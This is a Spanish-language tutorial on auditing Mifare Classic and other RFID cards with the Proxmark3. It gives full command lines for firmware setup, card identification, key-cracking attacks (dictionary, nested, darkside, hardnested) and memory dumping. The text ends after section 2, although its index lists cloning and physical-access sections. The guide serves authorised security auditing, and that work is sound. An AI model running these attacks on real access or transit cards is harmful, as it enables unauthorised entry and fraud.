# Guía Técnica de Estudio: Auditoría de Tarjetas RFID/NFC con Proxmark3

## Descripción General

Esta guía técnica proporciona un recorrido completo y estructurado para profesionales de la ciberseguridad que desean dominar la auditoría de sistemas RFID/NFC utilizando el Proxmark3. Desde los fundamentos teóricos hasta técnicas avanzadas de ataque, este documento cubre todo el ciclo de una auditoría de seguridad física: reconocimiento, obtención de claves, clonación, manipulación de datos y validación práctica.

El contenido está diseñado tanto para principiantes que se inician en la seguridad de radiofrecuencia como para auditores experimentados que buscan una referencia técnica detallada. Cada sección incluye explicaciones conceptuales, procedimientos paso a paso y ejemplos prácticos de comandos, permitiendo al lector comprender no solo el "cómo" sino también el "por qué" detrás de cada técnica.

**Nota Importante**: Las técnicas descritas en esta guía deben utilizarse exclusivamente en contextos legales y éticos, como auditorías de seguridad autorizadas, investigaciones académicas o evaluaciones de sistemas propios. El uso indebido de estas herramientas puede constituir un delito en la mayoría de las jurisdicciones.

## Índice

- [1. Fundamentos e Instalación](#1-fundamentos-e-instalación)
  - [1.1. Introducción a las Tecnologías Clave](#11-introducción-a-las-tecnologías-clave)
  - [1.2. Puesta en Marcha: Compilación y Flasheo del Firmware](#12-puesta-en-marcha-compilación-y-flasheo-del-firmware)
    - [1. Preparación del Entorno (Windows)](#1-preparación-del-entorno-windows)
    - [2. Preparación del Entorno (Linux/WSL)](#2-preparación-del-entorno-linuxwsl)
    - [3. Configuración del Makefile.platform](#3-configuración-del-makefileplatform)
    - [4. Compilación y Flasheo](#4-compilación-y-flasheo)
    - [5. Recuperación de un Brick (El "Truco del Botón")](#5-recuperación-de-un-brick-el-truco-del-botón)
    - [6. Verificación de la Instalación](#6-verificación-de-la-instalación)
- [2. Reconocimiento y Obtención de Claves](#2-reconocimiento-y-obtención-de-claves)
  - [2.1. Identificación y Análisis Inicial de la Tarjeta](#21-identificación-y-análisis-inicial-de-la-tarjeta)
    - [Identificación de Tarjetas de Alta Frecuencia (HF)](#identificación-de-tarjetas-de-alta-frecuencia-hf)
    - [Identificación de Tarjetas de Baja Frecuencia (LF)](#identificación-de-tarjetas-de-baja-frecuencia-lf)
  - [2.2. Ataques para la Obtención de Claves](#22-ataques-para-la-obtención-de-claves)
    - [1. Herramienta Automatizada: autopwn (Recomendado)](#1-herramienta-automatizada-autopwn-recomendado)
    - [2. Ataques Manuales Específicos](#2-ataques-manuales-específicos)
      - [2.1. Ataque de Diccionario (Claves por Defecto)](#21-ataque-de-diccionario-claves-por-defecto)
      - [2.2. Ataque Nested](#22-ataque-nested)
      - [2.3. Ataque StaticNested](#23-ataque-staticnested)
      - [2.4. Ataque Darkside (Tarjetas con PRNG Débil)](#24-ataque-darkside-tarjetas-con-prng-débil)
      - [2.5. Ataque Hardnested (Último Recurso)](#25-ataque-hardnested-último-recurso)
  - [2.3. Lectura del Contenido de la Tarjeta](#23-lectura-del-contenido-de-la-tarjeta)
    - [Lectura de Bloques Individuales](#lectura-de-bloques-individuales)
    - [Lectura de Sectores Completos](#lectura-de-sectores-completos)
    - [Volcado Completo de la Tarjeta](#volcado-completo-de-la-tarjeta)
    - [Visualización del Contenido del Dump](#visualización-del-contenido-del-dump)
    - [Análisis de Bits de Acceso (Access Bits)](#análisis-de-bits-de-acceso-access-bits)
    - [Estructura de Memoria Mifare Classic 1K](#estructura-de-memoria-mifare-classic-1k)
- [3. Clonación y Manipulación](#3-clonación-y-manipulación)
  - [3.1. Creación de un Backup y Clonación](#31-creación-de-un-backup-y-clonación)
    - [1. Creación del Archivo de Backup](#1-creación-del-archivo-de-backup)
    - [2. Clonación a una Tarjeta Mágica](#2-clonación-a-una-tarjeta-mágica)
      - [Método 1: Secuencia Automatizada (Recomendado para Gen2/CUID)](#método-1-secuencia-automatizada-recomendado-para-gen2cuid)
      - [Método 2: Clonación Manual para Tarjetas Gen1A](#método-2-clonación-manual-para-tarjetas-gen1a)
      - [Método 3: Clonación con Tarjetas Gen3 (APDU)](#método-3-clonación-con-tarjetas-gen3-apdu)
  - [3.2. Manipulación de Datos](#32-manipulación-de-datos)
    - [Proceso de Manipulación de Datos](#proceso-de-manipulación-de-datos)
      - [Paso 1: Obtener y Convertir el Volcado](#paso-1-obtener-y-convertir-el-volcado)
      - [Paso 2: Editar el Volcado](#paso-2-editar-el-volcado)
      - [Paso 3: Escribir los Datos Modificados](#paso-3-escribir-los-datos-modificados)
      - [Paso 4: Verificación de Cambios](#paso-4-verificación-de-cambios)
    - [Ejemplos Prácticos de Manipulación](#ejemplos-prácticos-de-manipulación)
- [4. Pruebas Reales y Simulación](#4-pruebas-reales-y-simulación)
  - [4.1. Simulación de Tarjetas](#41-simulación-de-tarjetas)
    - [Simulación de Alta Frecuencia (HF) - Mifare Classic](#simulación-de-alta-frecuencia-hf---mifare-classic)
      - [Paso 1: Cargar Datos en el Emulador](#paso-1-cargar-datos-en-el-emulador)
      - [Paso 2: Iniciar la Simulación](#paso-2-iniciar-la-simulación)
    - [Simulación de Baja Frecuencia (LF) - EM410x y Otros](#simulación-de-baja-frecuencia-lf---em410x-y-otros)
  - [4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)](#42-clonación-de-etiquetas-de-baja-frecuencia-llaveros)
    - [Clonación de EM410x (Llaveros Genéricos)](#clonación-de-em410x-llaveros-genéricos)
      - [Paso 1: Leer la Etiqueta Original](#paso-1-leer-la-etiqueta-original)
      - [Paso 2: Escribir en la Etiqueta Virgen](#paso-2-escribir-en-la-etiqueta-virgen)
      - [Paso 3: Verificación](#paso-3-verificación)
    - [Clonación de HID Prox (Control de Acceso)](#clonación-de-hid-prox-control-de-acceso)
      - [Secuencia Completa:](#secuencia-completa)
    - [Clonación de Indala](#clonación-de-indala)
    - [Configuración Manual del Chip T55xx](#configuración-manual-del-chip-t55xx)
    - [Borrado/Reset de Chip T55xx](#borradoreset-de-chip-t55xx)
  - [4.3. Pruebas de Acceso Físico](#43-pruebas-de-acceso-físico)
    - [Metodología de Pruebas de Acceso](#metodología-de-pruebas-de-acceso)
      - [Fase 1: Preparación y Autorización](#fase-1-preparación-y-autorización)
      - [Fase 2: Ejecución de Pruebas](#fase-2-ejecución-de-pruebas)
      - [Fase 3: Documentación de Resultados](#fase-3-documentación-de-resultados)
      - [Fase 4: Escenarios de Prueba Específicos](#fase-4-escenarios-de-prueba-específicos)
    - [Detección y Contramedidas Durante Pruebas](#detección-y-contramedidas-durante-pruebas)
    - [Consideraciones Éticas y Legales](#consideraciones-éticas-y-legales)
- [5. Herramientas Avanzadas y Automatización](#5-herramientas-avanzadas-y-automatización)
  - [5.1. Acelerando el Proceso de Auditoría](#51-acelerando-el-proceso-de-auditoría)
    - [Verificación Rápida de Claves con fchk](#verificación-rápida-de-claves-con-fchk)
    - [Automatización Completa con autopwn](#automatización-completa-con-autopwn)
  - [5.2. Modo de Operación Autónomo (Standalone)](#52-modo-de-operación-autónomo-standalone)
    - [Activación del Modo Standalone](#activación-del-modo-standalone)
    - [Verificar Modo Standalone Compilado](#verificar-modo-standalone-compilado)
    - [Modos Standalone Disponibles (LF)](#modos-standalone-disponibles-lf)
    - [Modos Standalone Disponibles (HF)](#modos-standalone-disponibles-hf)
    - [Modos Standalone de Recopilación de Datos](#modos-standalone-de-recopilación-de-datos)
    - [Compilar Modos Standalone Personalizados](#compilar-modos-standalone-personalizados)
    - [Casos de Uso Prácticos de Standalone](#casos-de-uso-prácticos-de-standalone)
- [Conclusión](#conclusión)

---

## 1. Fundamentos e Instalación

### 1.1. Introducción a las Tecnologías Clave

En el ámbito de la ciberseguridad, la auditoría de radiofrecuencia (RF) se ha consolidado como una disciplina crítica para evaluar la seguridad de sistemas de control de acceso físico y de pago sin contacto. La proliferación de tecnologías como RFID (Identificación por Radiofrecuencia) y NFC (Comunicación de Campo Cercano) en aplicaciones que van desde tarjetas de transporte público hasta pasaportes electrónicos y accesos corporativos, exige un profundo conocimiento de sus mecanismos de seguridad. Herramientas especializadas como el Proxmark3 son, por tanto, fundamentales en el arsenal de cualquier profesional de la seguridad. Comprender estas tecnologías no es un mero ejercicio académico, sino una necesidad estratégica para identificar y mitigar vulnerabilidades que podrían tener consecuencias físicas y financieras directas.

A continuación, se describen los conceptos esenciales para iniciar una auditoría con el Proxmark3:

**Proxmark3**: Es una herramienta de investigación y auditoría de RFID, diseñada para analizar, suplantar y clonar etiquetas de radiofrecuencia. Su arquitectura de hardware se basa en un procesador ARM (CPU), una FPGA (Field-Programmable Gate Array) para el manejo de señales de bajo nivel y una Memoria Flash para almacenar el firmware. Esta combinación le confiere una versatilidad única para interactuar con una amplia gama de protocolos RFID tanto de baja como de alta frecuencia.

**Tarjetas Mifare Classic**: Son uno de los tipos de tarjetas inteligentes sin contacto más extendidos en el mercado, utilizadas masivamente en sistemas de control de acceso y transporte. Su seguridad se basa en el cifrador propietario CRYPTO1, con una clave secreta de 48 bits. Una clave de 48 bits es, según los estándares criptográficos modernos, extremadamente débil y susceptible a ataques de fuerza bruta en cuestión de segundos con hardware ordinario. La seguridad del sistema dependía de mantener el algoritmo en secreto (security by obscurity), una práctica que ha demostrado ser ineficaz una vez que el cifrador fue desmantelado mediante ingeniería inversa en 2008. La memoria de la tarjeta está organizada lógicamente en sectores, que a su vez se dividen en bloques. El último bloque de cada sector, conocido como sector trailer, almacena las dos claves de acceso (A y B) y las condiciones de acceso para ese sector.

**Diferencias Tecnológicas (LF vs HF)**: Las tecnologías RFID operan en distintas bandas de frecuencia, cada una con características y aplicaciones específicas. Las dos más relevantes para el Proxmark3 son:

| Tecnología | Rango de Frecuencia | Ejemplos de Uso Común |
|------------|---------------------|------------------------|
| Baja Frecuencia (LF) | 125-134 kHz | Control de acceso (llaveros y tarjetas de proximidad, p. ej., EM410x), seguimiento de activos. |
| Alta Frecuencia (HF) | 13.56 MHz | Tarjetas de transporte público (Mifare), sistemas de pago sin contacto (NFC), pasaportes electrónicos. |

Con una base teórica sólida sobre estos conceptos, el siguiente paso es preparar la herramienta para su uso práctico, un proceso que implica compilar y flashear el firmware más adecuado.

### 1.2. Puesta en Marcha: Compilación y Flasheo del Firmware

El proceso de compilación y flasheo del firmware del Proxmark3 no es un paso opcional, sino una tarea crítica y recurrente para cualquier analista de seguridad. El firmware, especialmente la popular bifurcación RRG/Iceman, se encuentra en un estado de desarrollo constante ("bleeding edge"), con nuevas funcionalidades, optimizaciones y correcciones de errores que se añaden continuamente. Para un auditor, esto no es un inconveniente, sino una ventaja táctica. Cada actualización puede contener nuevos vectores de ataque contra sistemas de RF recientemente descubiertos, y no mantener la herramienta actualizada es el equivalente a ir a un pentest con un arsenal obsoleto. Mantener el cliente (el software en el PC) y el firmware (el software en el dispositivo) perfectamente sincronizados es vital para garantizar la estabilidad y el acceso a las últimas técnicas de ataque.

El siguiente procedimiento detalla la puesta en marcha de un Proxmark3 Easy (clasificado como PM3GENERIC) con el firmware RRG/Iceman.

#### 1. Preparación del Entorno (Windows)

El método más recomendado y consistente para Windows es utilizar **ProxSpace** (versión 3.x o superior). Se trata de un entorno de desarrollo sandbox preconfigurado que incluye el toolchain GNU ARM y un entorno Bash, eliminando la complejidad de gestionar dependencias manualmente.

Descarga ProxSpace desde el repositorio oficial y ejecútalo. Una vez dentro del entorno ProxSpace, clona el repositorio oficial de RRG/Iceman:

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
```

#### 2. Preparación del Entorno (Linux/WSL)

En sistemas Linux o en el Subsistema de Windows para Linux (WSL), es necesario instalar las dependencias manualmente. A continuación se proporciona el comando completo de instalación para una distribución basada en Debian/Ubuntu:

```bash
sudo apt-get update
sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config \
libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev \
libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev
```

**Desglose de dependencias por función:**

| Función | Paquetes |
|---------|----------|
| Compilador Cruzado ARM | `gcc-arm-none-eabi`, `libnewlib-dev` |
| Herramientas Base | `git`, `ca-certificates`, `build-essential`, `pkg-config` |
| Cliente Proxmark3 | `libreadline-dev`, `libbz2-dev`, `liblz4-dev`, `libssl-dev` |
| Soporte Bluetooth (opcional) | `libbluetooth-dev` |
| Interfaz gráfica (opcional) | `qtbase5-dev` |
| Scripts Python (opcional) | `libpython3-dev` |
| Soporte NFC ePaper (opcional) | `libgd-dev` |

> **Advertencia Crítica sobre ModemManager:**
>
> Un punto de fallo común en Linux es la interferencia del servicio **ModemManager**, que sondea automáticamente los puertos serie USB para detectar módems. Este servicio puede interferir con la comunicación del Proxmark3 e incluso **causar un brick del dispositivo durante el flasheo**. Es **obligatorio** deshabilitarlo antes de proceder:
> ```bash
> sudo systemctl stop ModemManager
> sudo systemctl disable ModemManager
> ```

Después de instalar las dependencias, clona el repositorio:

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
```

#### 3. Configuración del Makefile.platform

Este paso es **crítico y obligatorio** para evitar un brick del dispositivo. La configuración incorrecta puede resultar en un firmware incompatible que exceda el tamaño de la memoria flash o utilice configuraciones de hardware incorrectas.

**¿Por qué es necesario?** El repositorio está optimizado por defecto para el Proxmark3 RDV4, que tiene 512KB de flash y características adicionales (flash SPI externo, módulo de tarjeta inteligente). Los dispositivos genéricos como el Proxmark3 Easy pueden tener solo 256KB de flash y carecen de estas características.

Copia el archivo de configuración de ejemplo:

```bash
cp Makefile.platform.sample Makefile.platform
```

Edita el archivo `Makefile.platform` con tu editor preferido (nano, vim, etc.):

```bash
nano Makefile.platform
```

**Para un Proxmark3 Easy/Generic estándar (512KB):**

```makefile
PLATFORM=PM3GENERIC
```

**Para un Proxmark3 Easy con solo 256KB de flash:**

Si tu dispositivo tiene limitaciones de memoria (256KB), deberás desactivar funcionalidades para reducir el tamaño del firmware. Una configuración funcional típica sería:

```makefile
PLATFORM=PM3GENERIC
PLATFORM_SIZE=256
STANDALONE=
SKIP_HITAG=1
SKIP_FELICA=1
```

> **Nota:** El parámetro `PLATFORM_SIZE=256` provocará un error de compilación si el firmware excede el límite de 256KB, evitando así un brick por firmware demasiado grande.

#### 4. Compilación y Flasheo

Con el entorno preparado y la configuración correcta, procede a compilar e instalar el firmware:

**Paso 1 - Compilación:**

```bash
make clean && make -j
```

El parámetro `-j` habilita la compilación en paralelo, acelerando significativamente el proceso.

**Paso 2 - Flasheo del Firmware:**

El método más sencillo y recomendado es utilizar el script automático que detecta el puerto:

```bash
pm3-flash-all
```

Este comando flashea tanto el **bootrom** como el **fullimage** en una sola operación.

**Alternativa (especificando el puerto manualmente):**

Si el script automático no detecta tu dispositivo, especifica el puerto manualmente:

```bash
# En Linux
proxmark3 /dev/ttyACM0 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf

# En Windows (desde ProxSpace)
proxmark3 com3 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf
```

#### 5. Recuperación de un Brick (El "Truco del Botón")

Si el dispositivo no responde después del flasheo o no es detectado por el flasher (especialmente en la primera vez que se flashea un dispositivo nuevo), puedes forzarlo a entrar en modo bootloader:

**Procedimiento:**

1. **Desconecta** el Proxmark3 del puerto USB completamente.
2. **Mantén presionado** el botón físico del dispositivo.
3. **Mientras mantienes el botón presionado**, conecta el dispositivo al puerto USB.
4. **Observa los LEDs**: Dos de los cuatro LEDs deberían permanecer encendidos cuando sueltes el botón. Esto indica que estás en modo bootloader.
5. Suelta el botón (excepto en bootloaders muy antiguos, donde debes mantenerlo presionado durante todo el proceso).
6. Ejecuta nuevamente el comando de flasheo:

```bash
pm3-flash-all
```

> **Nota importante:** Si los LEDs no permanecen encendidos al soltar el botón, tienes un bootloader muy antiguo. En ese caso, repite el proceso pero **mantén el botón presionado durante todo el flasheo**.

#### 6. Verificación de la Instalación

Una vez completado el flasheo exitosamente, ejecuta el cliente para verificar que todo funciona correctamente:

```bash
pm3
```

O especificando el puerto:

```bash
proxmark3 /dev/ttyACM0
```

Dentro del cliente, ejecuta:

```
hw status
hw version
```

Deberías ver información sobre tu dispositivo, confirmando que el firmware y el cliente están sincronizados y funcionando correctamente.

Con el dispositivo actualizado y correctamente configurado, ya está listo para comenzar la fase de reconocimiento de tarjetas objetivo.

## 2. Reconocimiento y Obtención de Claves

### 2.1. Identificación y Análisis Inicial de la Tarjeta

Al igual que en una prueba de penetración de redes, la primera fase práctica de una auditoría RFID es el reconocimiento. Antes de intentar cualquier ataque, es fundamental identificar el tipo de tarjeta objetivo para determinar su tecnología, posibles vulnerabilidades y las vías de ataque más efectivas.

#### Identificación de Tarjetas de Alta Frecuencia (HF)

Para realizar una identificación inicial de una tarjeta de alta frecuencia (HF, 13.56 MHz), ejecuta el comando de búsqueda universal:

```bash
hf search
```

Este comando realiza un análisis automático y exhaustivo de la tarjeta presente, intentando identificar su tipo mediante la interacción con diferentes protocolos (ISO14443-A, ISO14443-B, ISO15693, etc.).

**Información crítica que devuelve el comando:**

- **UID (Unique Identifier)**: El número de serie único de la tarjeta. Puede ser de 4, 7 o 10 bytes. Un UID de 4 bytes suele indicar una tarjeta más simple, mientras que UIDs más largos pueden corresponder a tarjetas con mayor nivel de seguridad o funcionalidades extendidas.

- **ATQA (Answer to Request, Type A)**: Un valor de 2 bytes que proporciona información preliminar sobre el tipo de tarjeta y sus capacidades de comunicación. Por ejemplo, `0x0004` es común en Mifare Classic 1K.

- **SAK (Select Acknowledge)**: Este valor de 1 byte es **crucial para el auditor**, ya que determina de manera definitiva el tipo y tamaño de la tarjeta:
  - `0x08`: Mifare Classic 1K (16 sectores de 4 bloques cada uno, 1024 bytes totales)
  - `0x09`: Mifare Classic Mini (5 sectores, 320 bytes)
  - `0x18`: Mifare Classic 4K (40 sectores: 32 de 4 bloques + 8 de 16 bloques, 4096 bytes)
  - `0x28`: Mifare Classic 1K emulada
  - `0x88`: Mifare Classic 1K infinita (algunas tarjetas especiales)

- **ATS (Answer To Select)**: Si está presente, indica que la tarjeta soporta ISO14443-4, lo que puede significar que no es una Mifare Classic estándar.

**Ejemplo de salida típica:**

```
[+] UID: 35 3C 2A A6
[+] ATQA: 00 04
[+] SAK: 08 [2]
[=] TYPE: MIFARE Classic 1K
[=] Possible Types:
[+]  MIFARE Classic 1K
```

**Análisis adicional con comando específico:**

Para obtener información más detallada sobre una tarjeta Mifare específica, utiliza:

```bash
hf mf info
```

Este comando además de identificar el tipo de tarjeta, realiza pruebas para detectar:
- **Tarjetas mágicas** (Gen1a, Gen2, DirectWrite, etc.): Responden a comandos especiales de backdoor que permiten reescribir el bloque 0 (UID).
- **PRNG débil**: Algunas tarjetas Mifare antiguas utilizan generadores de números pseudoaleatorios predecibles, haciéndolas vulnerables al ataque Darkside.
- **Nonces estáticos**: Detecta si la tarjeta implementa nonces estáticos cifrados (contramedida contra el ataque nested).

#### Identificación de Tarjetas de Baja Frecuencia (LF)

Para tarjetas de baja frecuencia (125-134 kHz), como llaveros de acceso comunes, el comando es:

```bash
lf search
```

Este comando intenta identificar protocolos LF comunes como EM410x, HID Prox, Indala, T55x7, entre otros.

Una vez identificado el tipo de tarjeta como Mifare Classic, el siguiente paso lógico es intentar obtener las claves criptográficas que protegen el acceso a sus sectores de memoria.

### 2.2. Ataques para la Obtención de Claves

La estrategia para obtener las claves de una tarjeta Mifare Classic sigue un enfoque metodológico, comenzando con los métodos más simples y rápidos y escalando hacia técnicas más complejas solo si los primeros fallan. Este proceso demuestra una progresión lógica desde la explotación de configuraciones débiles hasta vulnerabilidades más profundas del protocolo.

#### 1. Herramienta Automatizada: autopwn (Recomendado)

El comando `hf mf autopwn` es la herramienta de automatización integral por excelencia para la auditoría de Mifare Classic. Ejecuta una secuencia inteligente y adaptativa de múltiples técnicas de ataque en el siguiente orden:

1. **Ataque de diccionario** con claves por defecto
2. **Ataque Darkside** (si la tarjeta es vulnerable)
3. **Ataque Nested** (si se encuentra al menos una clave)
4. **Ataque StaticNested** (para tarjetas con contramedidas)

**Sintaxis básica:**

```bash
hf mf autopwn
```

**Opciones avanzadas:**

```bash
hf mf autopwn --1k                           # Especifica Mifare Classic 1K
hf mf autopwn -k FFFFFFFFFFFF                # Proporciona una clave conocida como punto de partida
hf mf autopwn -s 0 -a -k FFFFFFFFFFFF       # Especifica sector 0, clave A conocida
hf mf autopwn -f mfc_default_keys.dic       # Utiliza un diccionario personalizado
hf mf autopwn --slow                         # Modo lento para tarjetas no estándar
hf mf autopwn -v                             # Salida verbose con estadísticas
```

**Parámetros importantes:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Especifica el tamaño de la tarjeta |
| `-k, --key <hex>` | Clave conocida (12 caracteres hexadecimales) |
| `-s, --sector <dec>` | Número de sector de la clave conocida |
| `-a` / `-b` | Especifica si la clave conocida es tipo A o B |
| `-f, --file <fn>` | Archivo de diccionario de claves |
| `--slow` | Adquisición más lenta (requerido para algunas tarjetas no estándar) |
| `-l, --legacy` | Usa el modo legacy (comando `hf mf chk` lento) |
| `-v, --verbose` | Salida detallada con estadísticas |

**Salida del comando:**

Si tiene éxito, `autopwn` genera automáticamente:
- **Archivo de claves**: `hf-mf-<UID>-key.bin` - Contiene todas las claves recuperadas
- **Archivo de volcado**: `hf-mf-<UID>-dump.bin` - Volcado completo de la memoria de la tarjeta
- **Archivo EML**: `hf-mf-<UID>-dump.eml` - Formato de texto para emulación
- **Archivo JSON**: `hf-mf-<UID>-dump.json` - Formato estructurado para análisis

#### 2. Ataques Manuales Específicos

Para situaciones donde se requiere un control más granular o cuando autopwn no tiene éxito, los siguientes ataques pueden ejecutarse manualmente:

##### 2.1. Ataque de Diccionario (Claves por Defecto)

Una cantidad sorprendentemente alta de sistemas que utilizan tarjetas Mifare Classic (estudios indican más del 30%) no cambian las claves de transporte predeterminadas de fábrica. Las claves más comunes son:

- `FFFFFFFFFFFF` (clave de fábrica por defecto)
- `A0A1A2A3A4A5` (clave MAD - Mifare Application Directory)
- `D3F7D3F7D3F7` (clave NDEF)
- `000000000000` (clave en blanco)
- `B0B1B2B3B4B5`, `AABBCCDDEEFF`, entre otras

**Comando de verificación rápida:**

```bash
hf mf chk --1k                               # Usa diccionario por defecto
hf mf chk --1k -f mfc_default_keys.dic      # Usa diccionario personalizado
hf mf chk --1k --dump                        # Guarda las claves encontradas
hf mf chk --1k --emu                         # Carga las claves en el emulador
```

**Verificación rápida (más veloz):**

El comando `hf mf fchk` (fast check) es una versión optimizada del ataque de diccionario:

```bash
hf mf fchk --1k                              # Verificación rápida con diccionario por defecto
hf mf fchk --1k --mem                        # Usa diccionario desde flashmemory (RDV4)
hf mf fchk --1k -f mfc_default_keys.dic     # Usa diccionario personalizado
```

##### 2.2. Ataque Nested

Este ataque explota una vulnerabilidad criptográfica fundamental en el protocolo de autenticación de CRYPTO1. Cuando el Proxmark3 se autentica con una clave conocida (ya sea A o B de cualquier sector), puede capturar información que se filtra del estado interno del cifrador durante las comunicaciones subsiguientes. Esta filtración permite calcular matemáticamente las claves de otros sectores.

**¿Cómo funciona?** Durante la autenticación, CRYPTO1 genera un "nonce" (número usado una sola vez). La debilidad radica en que el nonce y la respuesta cifrada revelan suficiente información sobre el keystream, permitiendo que un atacante con una clave conocida pueda derivar otras claves mediante análisis criptográfico.

**Sintaxis:**

```bash
hf mf nested --1k                                           # Automático para todas las claves
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF              # Especifica bloque y clave conocida
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF --dump       # Guarda dump automáticamente
```

**Parámetros:**

| Parámetro | Descripción |
|-----------|-------------|
| `--blk <dec>` | Número de bloque con clave conocida |
| `-a` / `-b` | Tipo de clave conocida (A o B) |
| `-k, --key <hex>` | Clave conocida (12 hex bytes) |
| `--tblk <dec>` | Bloque objetivo (opcional) |
| `--ta` / `--tb` | Tipo de clave objetivo |
| `--dump` | Genera dump automático tras recuperar todas las claves |

**Tiempo de ejecución:** Generalmente entre 5-30 segundos para recuperar todas las claves de una tarjeta 1K, dependiendo de la calidad de la señal.

##### 2.3. Ataque StaticNested

Como contramedida directa al ataque nested, algunos fabricantes implementaron tarjetas con **nonces estáticos cifrados**. Estas tarjetas generan siempre el mismo nonce para una clave dada, pero cifrado, intentando frustrar el ataque nested tradicional.

El ataque `staticnested` fue desarrollado específicamente para superar esta protección, demostrando la continua carrera armamentista en la seguridad de RF. Funciona recolectando múltiples respuestas cifradas y analizando los patrones para derivar las claves.

**Sintaxis:**

```bash
hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF
```

Los parámetros son idénticos al ataque nested estándar.

**Nota importante:** Este ataque requiere más tiempo (puede tardar varios minutos) y no todas las implementaciones de nonces estáticos son vulnerables. El comando intentará detectar automáticamente si la tarjeta es susceptible.

##### 2.4. Ataque Darkside (Tarjetas con PRNG Débil)

Algunas tarjetas Mifare Classic antiguas o de fabricantes alternativos utilizan generadores de números pseudoaleatorios (PRNG) débiles o predecibles. El ataque Darkside explota esta debilidad.

**Sintaxis:**

```bash
hf mf darkside
```

Este ataque es completamente autónomo y no requiere conocer ninguna clave previamente. Si la tarjeta es vulnerable, puede recuperar una clave válida en cuestión de segundos.

##### 2.5. Ataque Hardnested (Último Recurso)

Para tarjetas "endurecidas" que implementan contramedidas más sofisticadas, el ataque hardnested utiliza técnicas criptoanalíticas avanzadas y análisis estadístico profundo.

**Sintaxis:**

```bash
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
```

**Advertencia:** Este ataque puede tardar desde varios minutos hasta horas, requiere recolección de un gran número de nonces (~50,000+) y procesamiento offline intensivo. Se recomienda solo cuando todos los otros métodos han fallado.

### 2.3. Lectura del Contenido de la Tarjeta

Obtener las claves de acceso es el objetivo principal de la fase de ataque, ya que concede control total sobre la información almacenada en la tarjeta. Con las claves, un auditor puede leer, modificar o clonar los datos, que en última instancia representan el activo que el sistema de seguridad pretende proteger (por ejemplo, un crédito de transporte, un permiso de acceso o datos de identificación).

#### Lectura de Bloques Individuales

Para leer un bloque de memoria específico, se utiliza el comando `hf mf rdbl` (read block):

**Sintaxis:**

```bash
hf mf rdbl --blk <número> -a -k <clave>     # Usando clave A
hf mf rdbl --blk <número> -b -k <clave>     # Usando clave B
```

**Ejemplos prácticos:**

```bash
hf mf rdbl --blk 0 -a -k FFFFFFFFFFFF       # Lee el bloque 0 (fabricante) con clave A por defecto
hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF       # Lee el bloque 4 (primer bloque del sector 1)
hf mf rdbl --blk 7 -a -k A0A1A2A3A4A5       # Lee el sector trailer del sector 1
```

**Parámetros:**

| Parámetro | Descripción |
|-----------|-------------|
| `--blk <dec>` | Número de bloque a leer (0-255 dependiendo del tamaño de la tarjeta) |
| `-a` | Usar clave tipo A (por defecto) |
| `-b` | Usar clave tipo B |
| `-k, --key <hex>` | Clave de autenticación (12 caracteres hexadecimales) |

#### Lectura de Sectores Completos

Para leer todos los bloques de un sector específico, utiliza el comando `hf mf rdsc` (read sector):

```bash
hf mf rdsc -s 0 -a -k FFFFFFFFFFFF          # Lee todo el sector 0
hf mf rdsc -s 1 -a -k FFFFFFFFFFFF          # Lee todo el sector 1
```

Este comando es más eficiente cuando necesitas analizar todos los datos de un sector específico.

#### Volcado Completo de la Tarjeta

En la práctica, la lectura bloque por bloque rara vez es necesaria. Para un análisis completo, se recomienda realizar un **volcado total de la memoria**.

**Volcado automático tras recuperar claves:**

Tras un ataque exitoso con `hf mf autopwn`, se generan automáticamente varios archivos:

- `hf-mf-<UID>-dump.bin` - Volcado binario completo
- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas

**Volcado manual con archivo de claves:**

Si ya tienes un archivo de claves previamente guardado:

```bash
hf mf dump --1k                                        # Busca archivo de claves automáticamente basado en UID
hf mf dump --1k -k hf-mf-<UID>-key.bin                # Especifica archivo de claves
hf mf dump --1k -k hf-mf-<UID>-key.bin -f mydump      # Especifica nombre de salida personalizado
```

**Parámetros del comando dump:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta |
| `-k, --keys <fn>` | Archivo con las claves |
| `-f, --file <fn>` | Nombre personalizado para el archivo de salida |

#### Visualización del Contenido del Dump

Para analizar el contenido de un volcado sin necesidad de editores hexadecimales:

```bash
hf mf view -f hf-mf-<UID>-dump.bin                    # Vista completa del dump
hf mf view -f hf-mf-<UID>-dump.eml                    # Vista desde archivo EML
```

Este comando muestra:
- **Datos de cada bloque** en formato hexadecimal y ASCII
- **Sector trailers** con las claves y bytes de acceso
- **Decodificación de los bits de acceso** para cada sector
- **Bloques de valor** (si existen) con su interpretación decimal

#### Análisis de Bits de Acceso (Access Bits)

Para comprender los permisos de lectura/escritura de un sector específico:

```bash
hf mf acl -d <hex>                                     # Decodifica los access bits
```

**Ejemplo:**

```bash
hf mf acl -d 787788                                    # Decodifica los access bits típicos de fábrica
```

Esto mostrará una tabla interpretando qué operaciones (lectura, escritura, incremento, decremento) son permitidas con cada clave (A o B) para cada bloque del sector.

#### Estructura de Memoria Mifare Classic 1K

Para interpretar correctamente los datos, es importante comprender la estructura:

| Sectores | Bloques por Sector | Bloques Totales | Bytes por Bloque | Total |
|----------|-------------------|-----------------|------------------|-------|
| 16 | 4 | 64 | 16 | 1024 bytes |

- **Bloque 0 (Sector 0)**: Contiene el UID (4 bytes), BCC, manufacturer data. **Solo lectura en tarjetas estándar**.
- **Bloques 1-2 (Sector 0)**: Datos de usuario.
- **Bloque 3 (Sector trailer)**: Contiene Key A (6 bytes), Access Bits (3 bytes), GPB (1 byte), Key B (6 bytes).
